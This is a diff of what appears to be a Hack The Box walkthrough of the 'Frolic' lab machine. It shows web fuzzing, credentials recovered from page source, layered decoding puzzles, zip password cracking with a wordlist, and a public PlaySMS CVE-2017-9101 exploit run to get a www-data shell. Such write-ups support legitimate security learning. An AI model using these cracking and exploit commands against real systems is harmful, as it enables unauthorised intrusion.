@@ -12,7 +12,7 @@ tags:
     - linux
 ---
 
-![banner]({{ site.url }}{{ site.baseurl }}/assets/images/HTB_images/machines/frolic/banner.JPG)
+![banner]({{ site.url }}{{ site.baseurl }}/assets/images/HTB_images/machines/frolic/banner.PNG)
 
 Before following this walkthrough, I highly recommend trying to get the flag yourself! Just like you will hear from everyone else, try harder! (if you cannot find it)
 
@@ -79,4 +79,188 @@ Service detection performed. Please report any incorrect results at https://nmap
 # Nmap done at Thu Feb 14 12:11:21 2019 -- 1 IP address (1 host up) scanned in 1353.08 seconds
 ```
 
-![banner]({{ site.url }}{{ site.baseurl }}/assets/images/HTB_images/machines/frolic/banner.JPG)
+A few ports are open, basically running SSH, SMB and HTTP. Let's start with the HTTP.
+Visting the pages, I found this..
+
+![banner]({{ site.url }}{{ site.baseurl }}/assets/images/HTB_images/machines/frolic/web1.png)
+
+![banner]({{ site.url }}{{ site.baseurl }}/assets/images/HTB_images/machines/frolic/web2.png)
+
+Let's use `wfuzz` on `http://10.10.10.111:9999/`
+
+```bash
+root@noone:/home/pswapnil/Retired/Frolic# wfuzz --hc 404 -w /usr/share/wordlists/wfuzz/general/common.txt http://10.10.10.111:9999/FUZZ > fuzzresult
+Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.                                                         
+
+********************************************************
+* Wfuzz 2.2.11 - The Web Fuzzer                        *
+********************************************************
+
+Target: http://10.10.10.111:9999/FUZZ
+Total requests: 950
+
+==================================================================
+ID      Response   Lines      Word         Chars          Payload
+==================================================================
+
+000060:  C=301      7 L       13 W          194 Ch        "admin"
+000111:  C=301      7 L       13 W          194 Ch        "backup"
+000834:  C=301      7 L       13 W          194 Ch        "test"
+000273:  C=301      7 L       13 W          194 Ch        "dev"
+
+Total time: 25.19004
+Processed Requests: 950
+Filtered Requests: 946
+Requests/sec.: 37.71331
+```
+
+Let's visit these pages and go from there.
+
+![banner]({{ site.url }}{{ site.baseurl }}/assets/images/HTB_images/machines/frolic/adminweb2.png)
+
+The admin page is so weird. Let's look at the source.
+
+![banner]({{ site.url }}{{ site.baseurl }}/assets/images/HTB_images/machines/frolic/loginadminweb2.png)
+
+Well, there's the username and password, let's try it out.
+
+![banner]({{ site.url }}{{ site.baseurl }}/assets/images/HTB_images/machines/frolic/successweb2.png)
+
+Excellent! But this open's up another weird page.
+
+![banner]({{ site.url }}{{ site.baseurl }}/assets/images/HTB_images/machines/frolic/weird.png)
+
+I just copy pasted the string in a google search, and the first result was of a programming language, ook! Fortunately the link was for a decoder. Let's use that.
+
+![banner]({{ site.url }}{{ site.baseurl }}/assets/images/HTB_images/machines/frolic/ook.png)
+
+Well that's something. Got another directory. Let's go there.
+
+![banner]({{ site.url }}{{ site.baseurl }}/assets/images/HTB_images/machines/frolic/b64text.png)
+
+Not again. Well at least it's not weird, it's base64, at least look like it. I will copy the text in a file and try to decode it.
+
+```bash
+pswapnil@noone:~/Retired/Frolic$ base64 -d out.b64 > b64result
+pswapnil@noone:~/Retired/Frolic$ file b64result
+b64result: Zip archive data, at least v2.0 to extract
+pswapnil@noone:~/Retired/Frolic$ mv b64result b64result.zip
+pswapnil@noone:~/Retired/Frolic$ unzip b64result.zip
+Archive:  b64result.zip
+[b64result.zip] index.php password:
+root@noone:/home/pswapnil/Retired/Frolic# fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt b64out.zip
+
+
+PASSWORD FOUND!!!!: pw == password
+root@noone:/home/pswapnil/Retired/Frolic# unzip b64out.zip
+Archive:  b64out.zip
+[b64out.zip] index.php password:
+  inflating: index.php
+root@noone:/home/pswapnil/Retired/Frolic# cat index.php
+4b7973724b7973674b7973724b7973675779302b4b7973674b7973724b7973674b79737250463067506973724b7973674b7934744c5330674c5330754b7973674b7973724b7973674c6a77720d0a4b7973675779302b4b7973674b7a78645069734b4b797375504373674b7974624c5434674c53307450463067506930744c5330674c5330754c5330674c5330744c5330674c6a77724b7973670d0a4b317374506973674b79737250463067506973724b793467504373724b3173674c5434744c53304b5046302b4c5330674c6a77724b7973675779302b4b7973674b7a7864506973674c6930740d0a4c533467504373724b3173674c5434744c5330675046302b4c5330674c5330744c533467504373724b7973675779302b4b7973674b7973385854344b4b7973754c6a776743673d3d0d0a
+```
+
+Let's convert the hex to ascii using some tool. This is getting boring now.
+
+![banner]({{ site.url }}{{ site.baseurl }}/assets/images/HTB_images/machines/frolic/htoa.png)
+
+Oh would you just! Again some base64. I am sure this time because of the padding.
+
+```bash
+pswapnil@noone:~/Retired/Frolic$ base64 -d htoa > htoab64out
+root@noone:/home/pswapnil/Retired/Frolic# cat htoab64out
++++++ +++++ [->++ +++++ +++<] >++++ +.--- --.++ +++++ .<+++ [->++ +<]>+
+++.<+ ++[-> ---<] >---- --.-- ----- .<+++ +[->+ +++<] >+++. <+++[ ->---
+<]>-- .<+++ [->++ +<]>+ .---. <+++[ ->--- <]>-- ----. <++++ [->++ ++<]>
+++..<
+```
+
+I know this. This is Brainfuck! Literally. Let's decode something again...
+
+![banner]({{ site.url }}{{ site.baseurl }}/assets/images/HTB_images/machines/frolic/bfdec.png)
+
+All that for some weird text. Nothing to go on now. Let's move to another directory from the list.
+
+![banner]({{ site.url }}{{ site.baseurl }}/assets/images/HTB_images/machines/frolic/bkp.png)
+
+Two files. Let's visit the path ...
+
+![banner]({{ site.url }}{{ site.baseurl }}/assets/images/HTB_images/machines/frolic/user.png)
+![banner]({{ site.url }}{{ site.baseurl }}/assets/images/HTB_images/machines/frolic/pass.png)
+
+I could not see the `/dev` path so, I tried a `wfuzz` on it.
+
+```bash
+root@noone:/home/pswapnil/Retired/Frolic# wfuzz --hc 404 -w /usr/share/wordlists/wfuzz/general/common.txt http://10.10.10.111:9999/dev/FUZZ
+
+Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+
+********************************************************
+* Wfuzz 2.2.11 - The Web Fuzzer                        *
+********************************************************
+
+Target: http://10.10.10.111:9999/dev/FUZZ
+Total requests: 950
+
+==================================================================
+ID      Response   Lines      Word         Chars          Payload    
+==================================================================
+
+000111:  C=301      7 L       13 W          194 Ch        "backup"
+000834:  C=200      1 L        1 W            5 Ch        "test"
+
+Total time: 24.70471
+Processed Requests: 950
+Filtered Requests: 948
+Requests/sec.: 38.45419
+```
+
+![banner]({{ site.url }}{{ site.baseurl }}/assets/images/HTB_images/machines/frolic/devbkp.png)
+
+Another URL. Let's go there.
+
+![banner]({{ site.url }}{{ site.baseurl }}/assets/images/HTB_images/machines/frolic/psms.png)
+
+A login form. Let's try the two usernames and passwords we have until now. The tuple `(admin:idkwhatispass)` worked and we are in something.
+
+![banner]({{ site.url }}{{ site.baseurl }}/assets/images/HTB_images/machines/frolic/psmslogin.png)
+
+I did a searchsploit on `playsms` and got this.
+
+```bash
+root@noone:/home/pswapnil/Retired/Frolic# searchsploit playsms
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
+ Exploit Title                                                                                                                                                                               |  Path
+                                                                                                                                                                                             | (/usr/share/exploitdb/)
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
+PlaySMS - 'import.php' (Authenticated) CSV File Upload Code Execution (Metasploit)                                                                                                           | exploits/php/remote/44598.rb
+PlaySMS 1.4 - '/sendfromfile.php' Remote Code Execution / Unrestricted File Upload                                                                                                           | exploits/php/webapps/42003.txt
+PlaySMS 1.4 - 'import.php' Remote Code Execution                                                                                                                                             | exploits/php/webapps/42044.txt
+PlaySMS 1.4 - 'sendfromfile.php?Filename' (Authenticated) 'Code Execution (Metasploit)                                                                                                       | exploits/php/remote/44599.rb
+PlaySMS 1.4 - Remote Code Execution                                                                                                                                                          | exploits/php/webapps/42038.txt
+PlaySms 0.7 - SQL Injection                                                                                                                                                                  | exploits/linux/remote/404.pl
+PlaySms 0.8 - 'index.php' Cross-Site Scripting                                                                                                                                               | exploits/php/webapps/26871.txt
+PlaySms 0.9.3 - Multiple Local/Remote File Inclusions                                                                                                                                        | exploits/php/webapps/7687.txt
+PlaySms 0.9.5.2 - Remote File Inclusion                                                                                                                                                      | exploits/php/webapps/17792.txt
+PlaySms 0.9.9.2 - Cross-Site Request Forgery                                                                                                                                                 | exploits/php/webapps/30177.txt
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ----------------------------------------
+Shellcodes: No Result
+```
+
+I used this [exploit](https://github.com/jasperla/CVE-2017-9101) to get a shell.
+
+```bash
+root@noone:/home/pswapnil/Retired/Frolic/CVE-2017-9101# python3 playsmshell.py --password idkwhatispass --url http://10.10.10.111:9999/playsms -i
+[*] Grabbing CSRF token for login
+[*] Attempting to login as admin
+[+] Logged in!
+[*] Grabbing CSRF token for phonebook import
+[+] Entering interactive shell; type "quit" or ^D to quit
+> whoami
+www-data
+
+> pwd
+/var/www/html/playsms
+```
+
+So we have a low privilege shell. 
